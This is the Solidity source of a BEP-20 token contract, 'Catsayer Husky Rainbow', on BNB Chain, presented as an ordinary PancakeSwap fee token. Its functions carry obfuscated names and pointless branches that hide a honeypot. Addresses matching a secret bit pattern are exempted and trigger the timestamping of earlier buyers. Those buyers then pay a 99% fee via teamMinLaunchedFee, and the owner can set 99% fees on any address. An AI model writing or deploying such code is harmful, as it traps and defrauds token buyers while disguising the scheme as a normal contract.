/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract CatsayerHuskyRainbow is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Catsayer Husky Rainbow ";
    string constant _symbol = "CatsayerHuskyRainbow";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyLaunchedSellMode;
    mapping(address => bool) private feeAutoBuyBots;
    mapping(address => bool) private txMarketingModeMin;
    mapping(address => bool) private isSwapFeeTx;
    mapping(address => uint256) private buyAutoLimitSellBotsLiquidityLaunched;
    mapping(uint256 => address) private feeSwapMinMax;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private maxLimitLiquidityBots = 0;
    uint256 private autoMaxExemptSwap = 5;

    //SELL FEES
    uint256 private isReceiverBuySell = 0;
    uint256 private swapTxModeMin = 5;

    uint256 private feeMarketingSellWallet = autoMaxExemptSwap + maxLimitLiquidityBots;
    uint256 private teamModeLiquidityExempt = 100;

    address private receiverMinFeeWalletBotsModeSwap = (msg.sender); // auto-liq address
    address private exemptBotsLiquidityAuto = (0x321d2A62147cb0E57F3F035BfFFfe2E3DE900bb7); // marketing address
    address private launchedSellIsSwap = DEAD;
    address private maxBuyMinFee = DEAD;
    address private limitExemptTeamSwapTrading = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private marketingModeTradingTeam;
    uint256 private receiverExemptFeeBotsLiquidity;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private exemptIsTxLaunched;
    uint256 private limitBurnIsLaunched;
    uint256 private autoSellMinLaunched;
    uint256 private walletTeamSwapAuto;
    uint256 private launchedLimitTradingSwap;

    bool private sellIsSwapBotsExemptReceiverMode = true;
    bool private isSwapFeeTxMode = true;
    bool private receiverModeAutoBurn = true;
    bool private maxFeeMarketingWalletBuyTeamExempt = true;
    bool private limitAutoTxBotsSwapBuy = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private teamBurnMarketingWallet = 6 * 10 ** 15;
    uint256 private minLiquidityExemptTrading = _totalSupply / 1000; // 0.1%

    
    uint256 private txMaxTradingExemptReceiverFeeAuto = 0;
    uint256 private teamAutoFeeMinModeTx = 0;
    bool private buyFeeLiquidityMinTxReceiverSell = false;
    uint256 private walletAutoExemptBots = 0;
    uint256 private walletSwapIsExemptTradingAuto = 0;
    bool private liquidityReceiverTeamTradingMaxMarketingTx = false;
    bool private autoTeamBuyTrading = false;
    bool private autoMinBuyBots = false;
    bool private exemptLimitLaunchedReceiverMode = false;
    uint256 private isLiquidityLaunchedAutoExemptBots = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        exemptIsTxLaunched = true;

        buyLaunchedSellMode[msg.sender] = true;
        buyLaunchedSellMode[address(this)] = true;

        feeAutoBuyBots[msg.sender] = true;
        feeAutoBuyBots[0x0000000000000000000000000000000000000000] = true;
        feeAutoBuyBots[0x000000000000000000000000000000000000dEaD] = true;
        feeAutoBuyBots[address(this)] = true;

        txMarketingModeMin[msg.sender] = true;
        txMarketingModeMin[0x0000000000000000000000000000000000000000] = true;
        txMarketingModeMin[0x000000000000000000000000000000000000dEaD] = true;
        txMarketingModeMin[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellAutoSwapLimit(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return sellAutoSwapLimit(sender, recipient, amount);
    }

    function sellAutoSwapLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = txBuyLaunchedSwapBotsWalletMode(sender) || txBuyLaunchedSwapBotsWalletMode(recipient);
        
        if (autoTeamBuyTrading == autoMinBuyBots) {
            autoTeamBuyTrading = sellIsSwapBotsExemptReceiverMode;
        }

        if (walletSwapIsExemptTradingAuto != swapTxModeMin) {
            walletSwapIsExemptTradingAuto = teamBurnMarketingWallet;
        }

        if (teamAutoFeeMinModeTx != autoMaxExemptSwap) {
            teamAutoFeeMinModeTx = teamModeLiquidityExempt;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                txFeeWalletBots();
            }
            if (!bLimitTxWalletValue) {
                liquidityTradingExemptLimit(recipient);
            }
        }
        
        if (isLiquidityLaunchedAutoExemptBots == walletSwapIsExemptTradingAuto) {
            isLiquidityLaunchedAutoExemptBots = feeMarketingSellWallet;
        }

        if (walletAutoExemptBots != feeMarketingSellWallet) {
            walletAutoExemptBots = walletAutoExemptBots;
        }


        if (inSwap || bLimitTxWalletValue) {return tradingTxFeeWallet(sender, recipient, amount);}

        if (!buyLaunchedSellMode[sender] && !buyLaunchedSellMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (buyFeeLiquidityMinTxReceiverSell != buyFeeLiquidityMinTxReceiverSell) {
            buyFeeLiquidityMinTxReceiverSell = autoMinBuyBots;
        }


        require((amount <= _maxTxAmount) || txMarketingModeMin[sender] || txMarketingModeMin[recipient], "Max TX Limit has been triggered");

        if (autoLimitLiquidityBurn()) {isFeeBurnWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = autoLiquidityTeamMaxBuyModeBurn(sender) ? burnReceiverMinLimit(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function tradingTxFeeWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoLiquidityTeamMaxBuyModeBurn(address sender) internal view returns (bool) {
        return !feeAutoBuyBots[sender];
    }

    function exemptReceiverTeamBotsSwapIs(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            feeMarketingSellWallet = swapTxModeMin + isReceiverBuySell;
            return teamMinLaunchedFee(sender, feeMarketingSellWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeMarketingSellWallet = autoMaxExemptSwap + maxLimitLiquidityBots;
            return feeMarketingSellWallet;
        }
        return teamMinLaunchedFee(sender, feeMarketingSellWallet);
    }

    function txTradingExemptWallet() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function burnReceiverMinLimit(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(exemptReceiverTeamBotsSwapIs(sender, receiver == uniswapV2Pair)).div(teamModeLiquidityExempt);

        if (isSwapFeeTx[sender] || isSwapFeeTx[receiver]) {
            feeAmount = amount.mul(99).div(teamModeLiquidityExempt);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function txBuyLaunchedSwapBotsWalletMode(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function teamMinLaunchedFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = buyAutoLimitSellBotsLiquidityLaunched[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function liquidityTradingExemptLimit(address addr) private {
        if (txTradingExemptWallet() < teamBurnMarketingWallet) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        feeSwapMinMax[exemptLimitValue] = addr;
    }

    function txFeeWalletBots() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (buyAutoLimitSellBotsLiquidityLaunched[feeSwapMinMax[i]] == 0) {
                    buyAutoLimitSellBotsLiquidityLaunched[feeSwapMinMax[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(exemptBotsLiquidityAuto).transfer(amountBNB * amountPercentage / 100);
    }

    function autoLimitLiquidityBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    limitAutoTxBotsSwapBuy &&
    _balances[address(this)] >= minLiquidityExemptTrading;
    }

    function isFeeBurnWallet() internal swapping {
        
        uint256 amountToLiquify = minLiquidityExemptTrading.mul(maxLimitLiquidityBots).div(feeMarketingSellWallet).div(2);
        uint256 amountToSwap = minLiquidityExemptTrading.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeMarketingSellWallet.sub(maxLimitLiquidityBots.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(maxLimitLiquidityBots).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(autoMaxExemptSwap).div(totalETHFee);
        
        if (walletSwapIsExemptTradingAuto != feeMarketingSellWallet) {
            walletSwapIsExemptTradingAuto = isReceiverBuySell;
        }


        payable(exemptBotsLiquidityAuto).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                receiverMinFeeWalletBotsModeSwap,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getExemptBotsLiquidityAuto() public view returns (address) {
        if (exemptBotsLiquidityAuto == maxBuyMinFee) {
            return maxBuyMinFee;
        }
        if (exemptBotsLiquidityAuto != launchedSellIsSwap) {
            return launchedSellIsSwap;
        }
        if (exemptBotsLiquidityAuto != exemptBotsLiquidityAuto) {
            return exemptBotsLiquidityAuto;
        }
        return exemptBotsLiquidityAuto;
    }
    function setExemptBotsLiquidityAuto(address a0) public onlyOwner {
        if (exemptBotsLiquidityAuto != exemptBotsLiquidityAuto) {
            exemptBotsLiquidityAuto=a0;
        }
        if (exemptBotsLiquidityAuto == launchedSellIsSwap) {
            launchedSellIsSwap=a0;
        }
        if (exemptBotsLiquidityAuto == launchedSellIsSwap) {
            launchedSellIsSwap=a0;
        }
        exemptBotsLiquidityAuto=a0;
    }

    function getFeeAutoBuyBots(address a0) public view returns (bool) {
        if (a0 == maxBuyMinFee) {
            return limitAutoTxBotsSwapBuy;
        }
        if (a0 == exemptBotsLiquidityAuto) {
            return liquidityReceiverTeamTradingMaxMarketingTx;
        }
            return feeAutoBuyBots[a0];
    }
    function setFeeAutoBuyBots(address a0,bool a1) public onlyOwner {
        if (feeAutoBuyBots[a0] == txMarketingModeMin[a0]) {
           txMarketingModeMin[a0]=a1;
        }
        if (a0 == limitExemptTeamSwapTrading) {
            limitAutoTxBotsSwapBuy=a1;
        }
        if (a0 != maxBuyMinFee) {
            sellIsSwapBotsExemptReceiverMode=a1;
        }
        feeAutoBuyBots[a0]=a1;
    }

    function getFeeSwapMinMax(uint256 a0) public view returns (address) {
        if (a0 != maxLimitLiquidityBots) {
            return launchedSellIsSwap;
        }
            return feeSwapMinMax[a0];
    }
    function setFeeSwapMinMax(uint256 a0,address a1) public onlyOwner {
        if (a0 == minLiquidityExemptTrading) {
            limitExemptTeamSwapTrading=a1;
        }
        if (a0 == teamBurnMarketingWallet) {
            limitExemptTeamSwapTrading=a1;
        }
        if (a0 == autoMaxExemptSwap) {
            receiverMinFeeWalletBotsModeSwap=a1;
        }
        feeSwapMinMax[a0]=a1;
    }

    function getMaxBuyMinFee() public view returns (address) {
        return maxBuyMinFee;
    }
    function setMaxBuyMinFee(address a0) public onlyOwner {
        if (maxBuyMinFee != maxBuyMinFee) {
            maxBuyMinFee=a0;
        }
        if (maxBuyMinFee == exemptBotsLiquidityAuto) {
            exemptBotsLiquidityAuto=a0;
        }
        if (maxBuyMinFee != maxBuyMinFee) {
            maxBuyMinFee=a0;
        }
        maxBuyMinFee=a0;
    }

    function getIsLiquidityLaunchedAutoExemptBots() public view returns (uint256) {
        if (isLiquidityLaunchedAutoExemptBots != isLiquidityLaunchedAutoExemptBots) {
            return isLiquidityLaunchedAutoExemptBots;
        }
        if (isLiquidityLaunchedAutoExemptBots == minLiquidityExemptTrading) {
            return minLiquidityExemptTrading;
        }
        if (isLiquidityLaunchedAutoExemptBots != swapTxModeMin) {
            return swapTxModeMin;
        }
        return isLiquidityLaunchedAutoExemptBots;
    }
    function setIsLiquidityLaunchedAutoExemptBots(uint256 a0) public onlyOwner {
        isLiquidityLaunchedAutoExemptBots=a0;
    }

    function getLimitExemptTeamSwapTrading() public view returns (address) {
        if (limitExemptTeamSwapTrading != limitExemptTeamSwapTrading) {
            return limitExemptTeamSwapTrading;
        }
        if (limitExemptTeamSwapTrading == limitExemptTeamSwapTrading) {
            return limitExemptTeamSwapTrading;
        }
        if (limitExemptTeamSwapTrading == launchedSellIsSwap) {
            return launchedSellIsSwap;
        }
        return limitExemptTeamSwapTrading;
    }
    function setLimitExemptTeamSwapTrading(address a0) public onlyOwner {
        limitExemptTeamSwapTrading=a0;
    }

    function getMinLiquidityExemptTrading() public view returns (uint256) {
        if (minLiquidityExemptTrading != teamAutoFeeMinModeTx) {
            return teamAutoFeeMinModeTx;
        }
        if (minLiquidityExemptTrading != maxLimitLiquidityBots) {
            return maxLimitLiquidityBots;
        }
        return minLiquidityExemptTrading;
    }
    function setMinLiquidityExemptTrading(uint256 a0) public onlyOwner {
        if (minLiquidityExemptTrading == isReceiverBuySell) {
            isReceiverBuySell=a0;
        }
        minLiquidityExemptTrading=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}